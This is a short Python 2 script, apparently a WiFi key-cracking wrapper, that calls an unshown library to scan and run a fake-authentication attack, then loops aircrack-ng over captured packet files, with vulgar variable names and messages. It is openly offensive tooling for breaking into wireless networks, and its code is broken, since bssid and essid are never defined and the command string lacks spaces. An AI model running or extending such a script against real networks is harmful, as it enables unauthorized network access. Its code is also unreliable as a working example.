#!/usr/bin/python

import os
import time
import pussylib

pussylib.init()
pussylib.scan()
pussylib.fakeauth()


#crack dat shit
cuntin = "n"
while (cuntin == "n"):
	os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" "+essid+"*.cap &")
	cuntin = raw_input("Aircrack Successful?:")

print "I'm out biatch"
